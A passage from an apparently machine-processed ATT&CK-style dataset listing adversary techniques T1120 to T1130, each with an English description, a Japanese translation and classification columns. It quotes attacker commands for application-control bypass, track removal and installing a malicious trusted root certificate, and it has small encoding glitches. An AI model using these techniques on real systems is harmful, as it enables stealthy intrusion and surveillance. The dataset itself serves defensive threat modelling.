T1120,,Peripheral Device Discovery,周辺機器の発見,"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",攻撃者は、コンピュータシステムに接続された周辺機器やコンポーネントに関する情報を収集しようとする場合があります（引用：周辺機器の発見 Linux）（引用：周辺機器の発見 macOS）。周辺機器には、キーボード、プリンター、カメラ、スマートカードリーダー、リムーバブルストレージなど、さまざまな機能をサポートする補助リソースが含まれます。この情報は、システムやネットワーク環境に関する認識を高めるために使用されたり、さらなる行動のために使用されたりする場合があります。,discovery,Windows;macOS;Linux,discovery_enumeration,situational_awareness,network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643,2017-05-31T21:31:28.471Z,2025-04-25T15:15:22.038Z,,,,
T1121,,Regsvcs/Regasm,Regsvcs/Regasm,Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm) Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm),Regsvcs および Regasm は、.NET コンポーネント オブジェクト モデル (COM) アセンブリを登録するために使用される Windows コマンドライン ユーティリティです。どちらも Microsoft によってデジタル署名されています。(引用: MSDN Regsvcs) (引用: MSDN Regasm) 攻撃者は、信頼された Windows ユーティリティを介してコードの実行をプロキシするために Regsvcs および Regasm を使用できます。 両ユーティリティは、登録または登録解除前に実行すべきコードを指定するバイナリ内の属性（それぞれ <code>[ComRegisterFunction]</code> または <code>[ComUnregisterFunction]</code>）を使用して、プロセスホワイトリストをバイパスするために使用される可能性があります。登録および登録解除属性を持つコードは、プロセスが不十分な権限で実行され、実行に失敗した場合でも実行されます。 (引用: LOLBAS Regsvcs)(引用: LOLBAS Regasm),defense-evasion;execution,Windows,script_command_execution,stealth,endpoint_execution;network_connectivity,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002,attack-pattern--215190a9-9f02-4e83-bb5f-e0589965a302,2017-05-31T21:31:33.499Z,2025-04-25T15:15:15.735Z,,,,
T1122,,Component Object Model Hijacking,コンポーネントオブジェクトモデルハイジャック,"The Component Object Model (COM) is a system within Windows to enable interaction between software components through the operating system. (Citation: Microsoft Component Object Model) Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",コンポーネントオブジェクトモデル（COM）は、Windows 内でソフトウェアコンポーネント間の相互作用を可能にするシステムです。 (引用元: Microsoft Component Object Model) 攻撃者はこのシステムを悪用し、COM参照や関連性をハイジャックすることで、正当なソフトウェアの代わりに実行される悪意のあるコードを挿入し、永続化手段として利用できます。COMオブジェクトのハイジャックには、正当なシステムコンポーネントへの参照を置き換えるWindowsレジストリの変更が必要であり、これにより当該コンポーネントの実行時に動作しなくなる可能性があります。通常のシステム操作でそのシステムコンポーネントが実行されると、代わりに攻撃者のコードが実行されます。 (引用元: GDATA COMハイジャック) 攻撃者は、持続性を一定レベルで維持するのに十分な頻度で使用されるオブジェクトをハイジャックする可能性が高いが、検出につながるシステムの不安定化を避けるため、システム内で顕著な機能障害を引き起こす可能性の低いオブジェクトを標的とする傾向がある。,defense-evasion;persistence,Windows,config_policy_manipulation,stealth,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0003,attack-pattern--9b52fca7-1a36-4da0-b62d-da5bd83b4d69,2017-05-31T21:31:33.979Z,2025-04-25T15:15:54.452Z,,,,
T1123,,Audio Capture,音声キャプチャ,"An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019) Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",攻撃者は、コンピュータの周辺機器（例：マイクやウェブカメラ）やアプリケーション（例：音声通話・ビデオ通話サービス）を悪用し、機密会話の盗聴による情報収集を目的として音声記録をキャプチャする可能性がある。(引用: ESET Attor 2019年10月) マルウェアやスクリプトは、OSやアプリケーションが提供する利用可能なAPIを介してデバイスと通信し、音声をキャプチャするために使用される。 音声ファイルはディスクに書き込まれ、後で外部に流出される可能性がある。,collection,Linux;macOS;Windows,script_command_execution,asset_access,endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967,2017-05-31T21:31:34.528Z,2025-04-15T21:51:52.461Z,,,,
T1124,,System Time Discovery,システム時刻の発見,"An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citation: Mac Time Sync)(Citation: linux system time) System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service) In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion) On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd) On ESXi servers, `esxcli system clock get` can be used for the same purpose. In addition, system calls  Esuch as <code>time()</code>  Ehave been used to collect the current time on Linux devices.(Citation: MAGNET GOBLIN) On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.(Citation: System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022) This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)",攻撃者は、ローカルまたはリモートのシステムからシステム時刻やタイムゾーン設定を収集する場合があります。 システム時刻は、Windows の Windows Time Service や macOS の <code>systemsetup</code> などのサービスによって設定および保存されます。(引用元: MSDN System Time)(引用元: Technet Windows Time Service)(引用元: systemsetup mac time) これらの時刻設定は、企業ネットワーク内のシステムとサービス間で同期される場合もあり、通常はドメイン内のネットワーク時刻サーバーによって実現されます。(引用: Mac Time Sync)(引用: linux system time) システム時刻情報は、Windows では [Net](https://attack.mitre.org/software/S0039) を使用して <code>net time \\hostname</code> を実行しリモートシステムのシステム時刻を取得するなど、様々な方法で収集できます。 被害者のタイムゾーンは、現在のシステム時刻から推測されるか、<code>w32tm /tz</code>を使用して収集される。(引用元: Technet Windows Time Service) さらに、攻撃者は<code>GetTickCount()</code>などの関数を通じてデバイスの稼働時間を発見し、システム起動からの経過時間を特定できる。(引用元: Virtualization/Sandbox Evasion) ネットワークデバイスでは、`show clock detail`などの[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)コマンドを使用して現在の時刻設定を確認できます。(引用元: show_clock_detail_cisco_cmd) ESXiサーバーでは、`esxcli system clock get`が同様の目的で使用可能です。 さらに、Linuxデバイスでは<code>time()</code>などのシステムコールが現在の時刻収集に利用されてきた。(引用: MAGNET GOBLIN) macOSシステムでは、攻撃者が<code>systemsetup -gettimezone</code>や<code>timeIntervalSinceNow</code>などのコマンドを用いて現在のタイムゾーン情報、あるいは現在の日時を収集する可能性がある。(引用: System Information Discovery Technique)(引用: ESET DazzleSpy Jan 2022) この情報は、[Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(引用: RSA EU12 They're Inside)の実行や、タイムゾーンに基づく地域情報の発見（被害者ターゲティング支援のため、例：[システム位置情報発見](https://attack.mitre.org/techniques/T1614)）に活用される可能性があります。攻撃者はシステム時刻の知識を、タイムボムの一部として、または指定された日時まで実行を遅延させるために利用することもあります。(引用: AnyRun TimeBomb),discovery,Windows;Network Devices;Linux;macOS;ESXi,script_command_execution,situational_awareness,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077,2017-05-31T21:31:37.450Z,2025-04-15T19:59:21.176Z,,,,
T1125,,Video Capture,ビデオキャプチャ,"An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files. Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen. In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)",攻撃者は、情報収集を目的として、コンピュータの周辺機器（例：内蔵カメラやウェブカメラ）やアプリケーション（例：ビデオ通話サービス）を利用して動画記録をキャプチャすることが可能です。動画ファイルの代わりに、デバイスやアプリケーションから画像をキャプチャすることも可能であり、指定された間隔で実行される場合があります。マルウェアやスクリプトは、オペレーティングシステムやアプリケーションが提供する利用可能なAPIを介してデバイスと対話し、動画や画像をキャプチャするために使用されることがあります。 動画や画像ファイルはディスクに書き込まれ、後で外部に流出される可能性がある。この手法は、被害者の画面をキャプチャするのではなく、動画記録用の特定のデバイスやアプリケーションを使用する点で[画面キャプチャ](https://attack.mitre.org/techniques/T1113)とは異なる。macOSでは、FruitFlyやProtonなど、ユーザーのウェブカメラを録画するマルウェアサンプルがいくつか存在する。 (引用元: objective-see 2017年レビュー),collection,Windows;macOS;Linux,script_command_execution,asset_access,user_interaction;endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf,2017-05-31T21:31:37.917Z,2025-04-25T15:15:42.332Z,,,,
T1126,,Network Share Connection Removal,ネットワーク共有接続の削除,Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\system\share /delete</code> command. (Citation: Technet Net Use),攻撃者は、操作の痕跡を消去するため、不要になった共有接続を削除することがあります。Windows共有ドライブや[Windows管理共有](https://attack.mitre.org/techniques/T1077)への接続は、不要になった時点で削除される可能性があります。 [Net](https://attack.mitre.org/software/S0039)は、<code>net use \\system\share /delete</code>コマンドでネットワーク共有接続を削除できるユーティリティの一例である。(引用元: Technet Net Use),defense-evasion,Windows,script_command_execution,stealth,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--e7eab98d-ae11-4491-bd28-a53ba875865a,2017-05-31T21:31:38.350Z,2025-04-25T15:16:19.031Z,,,,
T1127,,Trusted Developer Utilities Proxy Execution,信頼された開発者ユーティリティによるプロキシ実行,"Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions. Smart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microsoft cloud service before executing them.(Citation: Microsoft Smart App Control) However, adversaries may leverage ""reputation hijacking"" to abuse an operating system’s trust of safe, signed applications that support the execution of arbitrary code. By leveraging [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127) to run their malicious code, adversaries may bypass Smart App Control protections.(Citation: Elastic Security Labs)",攻撃者は、信頼された開発者ユーティリティを悪用して悪意のあるペイロードの実行をプロキシ化する場合があります。ソフトウェア開発関連のタスクに使用される多くのユーティリティは、開発、デバッグ、リバースエンジニアリングを支援するために様々な形式でコードを実行するために利用可能です。(引用: engima0x3 DNX Bypass)(引用: engima0x3 RCSI Bypass)(引用: Exploit Monday WinDbg)(引用: LOLBAS Tracker) これらのユーティリティは、正当な証明書で署名されていることが多く、システム上で実行可能であり、信頼されたプロセスを介して悪意のあるコードの実行をプロキシすることで、アプリケーション制御ソリューションを効果的にバイパスします。スマート アプリ コントロールは、Windows の機能であり、実行前に署名されていないアプリケーションを Microsoft クラウド サービスの既知の安全リストと照合することで、潜在的に悪意があると見なされるアプリケーションの実行をブロックします。(引用: Microsoft Smart App Control) しかし攻撃者は「レピュテーションハイジャック」を悪用し、任意コード実行を可能にする安全な署名済みアプリケーションに対するOSの信頼関係を悪用する可能性があります。[Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127)を利用して悪意のあるコードを実行することで、攻撃者はSmart App Controlの保護機能を回避できるのです。(引用元: Elastic Security Labs),defense-evasion,Windows,discovery_enumeration,stealth,endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--ff25900d-76d5-449b-a351-8824e62fc81b,2017-05-31T21:31:39.262Z,2025-04-15T19:59:24.863Z,,,,
T1127.001,T1127,MSBuild,MSBuild,"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild) Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)",攻撃者はMSBuildを利用して、信頼されたWindowsユーティリティを介したコード実行をプロキシする可能性があります。MSBuild.exe（Microsoft Build Engine）はVisual Studioで使用されるソフトウェアビルドプラットフォームです。これは、様々なプラットフォームや構成のロードおよびビルド要件を定義するXML形式のプロジェクトファイルを扱います。（引用元：MSDN MSBuild）攻撃者はMSBuildを悪用し、悪意のあるコードの実行をプロキシすることが可能です。 .NET バージョン 4 で導入された MSBuild のインライン タスク機能により、C# または Visual Basic コードを XML プロジェクト ファイルに挿入できます。(引用元: MSDN MSBuild)(引用元: Microsoft MSBuild Inline Tasks 2017) MSBuild はインライン タスクをコンパイルして実行します。 MSBuild.exeは署名付きMicrosoftバイナリであるため、この方法で利用されると任意のコードを実行でき、MSBuild.exeの実行を許可するように設定されたアプリケーション制御防御を迂回することが可能です。（引用元：LOLBAS Msbuild）,defense-evasion,Windows,config_policy_manipulation,stealth,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--c92e3d68-2349-49e4-a341-7edca2deff96,2020-03-27T21:50:26.042Z,2025-04-16T20:37:20.712Z,,,,
T1127.002,T1127,ClickOnce,ClickOnce,"Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility.(Citation: Burke/CISA ClickOnce BlackHat) ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application.(Citation: SpectorOps Medium ClickOnce) Because ClickOnce applications receive only limited permissions, they do not require administrative permissions to install.(Citation: Microsoft Learn ClickOnce) As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges. ClickOnce may be abused in a number of ways. For example, an adversary may rely on [User Execution](https://attack.mitre.org/techniques/T1204). When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation.(Citation: NetSPI ClickOnce) Adversaries may also abuse ClickOnce to execute malware via a [Rundll32](https://attack.mitre.org/techniques/T1218/011) script using the command `rundll32.exe dfshim.dll,ShOpenVerbApplication1`.(Citation: LOLBAS /Dfsvc.exe) Additionally, an adversary can move the ClickOnce application file to a remote user’s startup folder for continued malicious code deployment (i.e., [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)).(Citation: Burke/CISA ClickOnce BlackHat)(Citation: Burke/CISA ClickOnce Paper)","攻撃者は、信頼されたWindowsユーティリティを介したコード実行をプロキシするために、ClickOnceアプリケーション（.appref-msおよび.applicationファイル）を利用することがあります。(引用元: Burke/CISA ClickOnce BlackHat) ClickOnce は、ユーザーがファイル共有や Web ページから最小限の操作でインストールおよび実行できる、自己更新型の Windows ベースの .NET アプリケーション（.XBAP、.EXE、または .DLL）を作成できるデプロイメントです。 アプリケーションはDFSVC.EXEの子プロセスとして起動し、このプロセスがアプリケーションのインストール、起動、更新を担当します。(引用元: SpectorOps Medium ClickOnce) ClickOnceアプリケーションは限定的な権限のみを取得するため、インストールに管理者権限を必要としません。(引用元: Microsoft Learn ClickOnce) したがって、攻撃者は権限昇格を必要とせずに悪意のあるコードの実行をプロキシするためにClickOnceを悪用する可能性があります。 ClickOnceは様々な方法で悪用される可能性があります。例えば、攻撃者は[ユーザー実行](https://attack.mitre.org/techniques/T1204)に依存する場合があります。ユーザーが悪意のあるWebサイトを訪問すると、.NETマルウェアが正当なソフトウェアに偽装され、インストール用のClickOnceポップアップが表示されます。(引用元: NetSPI ClickOnce) 攻撃者はまた、`rundll32.exe dfshim.dll,ShOpenVerbApplication1` コマンドを使用した [Rundll32](https://attack.mitre.org/techniques/T1218/011) スクリプトを介してマルウェアを実行するために ClickOnce を悪用する可能性があります。(引用元: LOLBAS /Dfsvc.exe)さらに、攻撃者はClickOnceアプリケーションファイルをリモートユーザーのスタートアップフォルダに移動させ、悪意のあるコードを継続的に展開することが可能です（例: [レジストリ実行キー / スタートアップフォルダ](https://attack.mitre.org/techniques/T1547/001)）。(引用元: Burke/CISA ClickOnce BlackHat)(引用元: Burke/CISA ClickOnce Paper)",defense-evasion,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--cc279e50-df85-4c8e-be80-6dc2eda8849c,2024-09-09T14:39:28.637Z,2025-04-15T19:59:08.154Z,,,,
T1127.003,T1127,JamPlus,JamPlus,"Adversaries may use `JamPlus` to proxy the execution of a malicious script. `JamPlus` is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio.(Citation: JamPlus manual) Adversaries may abuse the `JamPlus` build utility to execute malicious scripts via a `.jam` file, which describes the build process and required dependencies. Because the malicious script is executed from a reputable developer tool, it may subvert application control security systems such as Smart App Control.(Citation: Cyble)(Citation: Elastic Security Labs)",攻撃者は悪意のあるスクリプトの実行をプロキシするために`JamPlus`を利用する場合があります。`JamPlus`はコードおよびデータ構築システム向けのビルドユーティリティツールです。複数の主要コンパイラと連携し、Visual Studioなどのコードエディタにおけるワークスペース生成に使用可能です。(引用: JamPlusマニュアル)攻撃者は`JamPlus`ビルドユーティリティを悪用し、ビルドプロセスと必要な依存関係を記述する`.jam`ファイルを介して悪意のあるスクリプトを実行する可能性があります。悪意のあるスクリプトが信頼できる開発ツールから実行されるため、Smart App Controlなどのアプリケーション制御セキュリティシステムを回避する可能性があります。(引用: Cyble)(引用: Elastic Security Labs),defense-evasion,Windows,script_command_execution,stealth,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--7d356151-a69d-404e-896b-71618952702a,2025-03-21T13:36:48.710Z,2025-04-17T21:42:31.066Z,,,,
T1128,,Netsh Helper DLL,Netsh ヘルパー DLL,Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>. Adversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a persistent manner when netsh.exe is executed automatically with another Persistence technique or if other persistent software is present on the system that executes netsh.exe as part of its normal functionality. Examples include some VPN software that invoke netsh.exe. (Citation: Demaske Netsh Persistence) Proof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs. (Citation: Github Netsh Helper CS Beacon),Netsh.exe（別名 Netshell）は、システムのネットワーク構成を操作するためのコマンドラインスクリプトユーティリティです。ユーティリティの機能を拡張するためのヘルパー DLL を追加する機能を備えています。(引用元: TechNet Netsh) 登録された netsh.exe ヘルパー DLL のパスは、Windows レジストリの <code>HKLM\SOFTWARE\Microsoft\Netsh</code> に格納されます。 攻撃者は、netsh.exe が別の永続化手法で自動実行される場合、またはシステム上に netsh.exe を通常機能の一部として実行する他の永続化ソフトウェアが存在する場合、netsh.exe とヘルパー DLL を組み合わせて任意のコードを永続的にプロキシ実行できます。例としては、netsh.exe を呼び出す一部の VPN ソフトウェアが挙げられます。 (引用: Demaske Netsh Persistence) netsh.exe ヘルパー DLL を使用して Cobalt Strike のペイロードをロードする概念実証コードが存在する。(引用: Github Netsh Helper CS Beacon),persistence,Windows,remote_service_abuse,foothold,endpoint_execution;network_connectivity,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--bb0e0cb5-f3e4-4118-a4cb-6bf13bfbc9f2,2017-05-31T21:31:40.168Z,2025-04-25T15:16:03.767Z,,,,
T1129,,Shared Modules,共有モジュール,"Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)). Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective. The Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation: RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017) The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft DLL)",攻撃者は共有モジュールのロードを介して悪意のあるペイロードを実行する可能性があります。共有モジュールとは、特定のカスタム関数やOS API関数（例：[ネイティブAPI](https://attack.mitre.org/techniques/T1106)）の呼び出しなど、再利用可能なコードへのアクセスを提供するためにプロセスにロードされる実行可能ファイルです。攻撃者はこの機能を利用して、被害者システム上で任意のペイロードを実行する手段として利用する可能性があります。 例えば、攻撃者はマルウェアの機能をモジュール化し、C2ネットワーク通信の管理や標的での特定アクションの実行など様々な機能を行う共有オブジェクトを作成できます。LinuxおよびmacOSのモジュールローダーは、任意のローカルパスから共有オブジェクトをロードして実行できます。この機能は`dlfcn.h`内の`dlopen`や`dlsym`などの関数に実装されています。macOSは`.so`ファイルを実行可能ですが、一般的な慣行では`.dylib`ファイルが使用されます。(引用: Apple Dev Dynamic Libraries)(引用: Linux Shared Libraries)(引用: RotaJakiro 2021 netlab360 analysis)(引用: Unit42 OceanLotus 2017) Windowsモジュールローダーは、任意のローカルパスおよび任意のユニバーサルネーミングコンベンション(UNC)ネットワークパスからDLLをロードするよう指示可能です。 この機能は `NTDLL.dll` に存在し、実行時に `LoadLibrary` などの関数から呼び出される Windows [ネイティブ API](https://attack.mitre.org/techniques/T1106) の一部です。(引用: Microsoft DLL),execution,Windows;macOS;Linux,c2_communication,foothold,endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65,2017-05-31T21:31:40.542Z,2025-04-15T19:58:04.668Z,,,,
T1130,,Install Root Certificate,ルート証明書のインストール,"Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website. Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental) Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish) Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017) In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",ルート証明書は、公開鍵暗号方式においてルート認証局（CA）を識別するために使用されます。ルート証明書がインストールされると、システムまたはアプリケーションは、そのルート証明書によって署名されたルート証明書の信頼チェーン内の証明書を信頼するようになります。 (出典: Wikipedia ルート証明書)証明書は、ウェブブラウザ内で安全なTLS/SSL通信を確立するために一般的に使用されます。ユーザーが信頼されていない証明書を提示するウェブサイトを閲覧しようとすると、セキュリティリスクを警告するエラーメッセージが表示されます。 セキュリティ設定によっては、ブラウザが当該ウェブサイトへの接続を許可しない場合があります。侵害されたシステムにルート証明書をインストールすると、攻撃者がそのシステムのセキュリティを低下させる手段を提供することになります。攻撃者はこの手法を利用し、侵害されたシステムがHTTPS経由で攻撃者が制御するWebサーバー（正規サイトを偽装してログイン認証情報を収集する）に接続する際、ユーザーに表示されるセキュリティ警告を回避してきました。 (出典: Operation Emmental) 製造元やソフトウェア供給チェーンによってシステムにプリインストールされた非標準ルート証明書も存在し、マルウェア/アドウェアと組み合わせて、安全なTLS/SSL通信で送信される情報を傍受する中間者攻撃（MITM）を実現するために利用された。(出典: Kaspersky Superfish) ルート証明書（および関連する証明書チェーン）は複製・再インストールも可能である。 複製された証明書チェーンは元の証明書と多くのメタデータ特性を共有し、悪意のあるコードの署名に使用される可能性がある。これにより、実行を阻止したり永続化の痕跡を発見するために使用される署名検証ツール（例：Sysinternals、アンチウイルスなど）を迂回できる。（出典：SpectorOps Code Signing Dec 2017） macOSでは、Ay MaMiマルウェアが<code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code>を使用して、悪意のある証明書を信頼されたルート証明書としてシステムキーチェーンにインストールします。（引用元：objective-see ay mami 